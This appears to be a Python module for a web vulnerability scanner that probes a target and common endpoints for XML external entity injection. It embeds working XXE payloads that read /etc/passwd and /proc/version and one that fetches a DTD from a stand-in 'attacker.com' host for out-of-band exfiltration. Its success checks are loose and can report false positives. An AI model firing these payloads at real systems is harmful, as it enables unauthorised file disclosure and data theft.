from core.base_scanner import BaseScanner
from core.utils import RequestUtils
from typing import Dict, List, Optional
import logging
import re
import urllib.parse

class XXEInjectionScanner(BaseScanner):
    def __init__(self, target_url: str, config: Dict):
        super().__init__(target_url, config)
        
        # Comprehensive XXE payloads with categorization
        self.payloads = [
            {
                'type': 'File Read',
                'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                'vulnerable_parameter': 'xml_input',
                'description': 'Attempts to read /etc/passwd file'
            },
            {
                'type': 'System Information',
                'payload': '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///proc/version">%xxe;]><test>test</test>',
                'vulnerable_parameter': 'xml_input',
                'description': 'Retrieves system version information'
            },
            {
                'type': 'Error-based XXE',
                'payload': '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///nonexistent">]><root>&test;</root>',
                'vulnerable_parameter': 'xml_input',
                'description': 'Triggers error-based XXE by referencing non-existent file'
            },
            {
                'type': 'Out-of-band XXE',
                'payload': '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><test>test</test>',
                'vulnerable_parameter': 'xml_input',
                'description': 'Attempts out-of-band XXE data exfiltration'
            }
        ]
        
        # Endpoints to test for XXE
        self.endpoints = [
            '/xxe',
            '/upload',
            '/import',
            '/api/data',
            '/xml',
            '/soap',
            '/parse',
            '/process',
            '/convert'
        ]

    def scan(self) -> Dict:
        """
        Perform XXE injection vulnerability scanning
        
        Returns:
            Dict of detected vulnerabilities
        """
        logging.info(f"Starting XXE Injection scan on {self.target_url}")
        vulnerabilities = []
        
        # Test base URL
        base_result = self.test_xxe_injection(self.target_url)
        if base_result:
            vulnerabilities.extend(base_result)
        
        # Test additional endpoints
        for endpoint in self.endpoints:
            full_url = self.target_url.rstrip('/') + endpoint
            endpoint_results = self.test_xxe_injection(full_url)
            if endpoint_results:
                vulnerabilities.extend(endpoint_results)
        
        logging.info(f"XXE Injection scan completed. Found {len(vulnerabilities)} vulnerabilities.")
        return {
            'xxe_injection': vulnerabilities
        } if vulnerabilities else {}

    def test_xxe_injection(self, url: str) -> Optional[List[Dict]]:
        """
        Test a specific URL for XXE injection vulnerabilities
        
        Args:
            url (str): URL to test
        
        Returns:
            Optional list of vulnerability details
        """
        vulnerabilities = []
        
        for payload_info in self.payloads:
            try:
                # Prepare payload and test
                payload = payload_info['payload']
                response = self.make_request(url, method='POST', data={'xml': payload})
                
                # Verify XXE vulnerability
                if self.verify_xxe_injection(response, payload_info):
                    vulnerability = {
                        'type': 'XXE Injection',
                        'name': 'XML External Entity Injection',
                        'url': url,
                        'severity': 'High',
                        'method': 'POST',
                        'parameter': payload_info['vulnerable_parameter'],
                        'payload': payload_info['payload'],
                        'details': f"XXE Vulnerability detected: {payload_info['description']}",
                        'recommendation': self.get_recommendations(),
                        'evidence': self.generate_evidence(payload_info)
                    }
                    vulnerabilities.append(vulnerability)
            
            except Exception as e:
                logging.error(f"Error testing XXE injection on {url}: {e}")
        
        return vulnerabilities if vulnerabilities else None

    def verify_xxe_injection(self, response, payload_info: Dict) -> bool:
        """
        Verify if the response indicates a successful XXE injection
        
        Args:
            response: HTTP response object
            payload_info (Dict): Information about the payload
        
        Returns:
            bool: True if XXE injection is detected
        """
        if not response:
            return False
        
        # Check response text for potential XXE indicators
        response_text = str(response.text).lower()
        
        # Indicators of successful XXE
        indicators = [
            'root:x:',      # Passwd file content
            'linux version',# System version
            'proc/version', # System information
            'no such file', # Error-based XXE
            'connection refused'  # Out-of-band XXE attempt
        ]
        
        return any(indicator in response_text for indicator in indicators)

    def generate_evidence(self, payload_info: Dict) -> str:
        """
        Generate detailed evidence for the XXE vulnerability
        
        Args:
            payload_info (Dict): Information about the payload
        
        Returns:
            Formatted evidence string
        """
        evidence = f"""
Payload Type: {payload_info['type']}
Vulnerable Mechanism: XML External Entity Processing

Payload Details:
{payload_info['payload']}

Description:
{payload_info['description']}

Potential Impact:
- Unauthorized file read
- Information disclosure
- Potential remote code execution
"""
        return evidence

    def get_recommendations(self) -> str:
        """
        Generate recommendations for XXE vulnerability mitigation
        
        Returns:
            Recommendations as a string
        """
        return "\n".join([
            "1. Disable XML external entity processing",
            "2. Use XML parsers that do not resolve external entities",
            "3. Implement input validation for XML parsing",
            "4. Use allowlists for XML input sources",
            "5. Update XML parsing libraries to latest secure versions"
        ])

    def execute_task(self, task: Dict) -> Optional[Dict]:
        """
        Execute a specific XXE injection task
        
        Args:
            task (Dict): Task configuration
        
        Returns:
            Optional vulnerability details
        """
        if task.get('type') == 'xxe_injection':
            return self.test_xxe_injection(task.get('url', ''))
        
        return None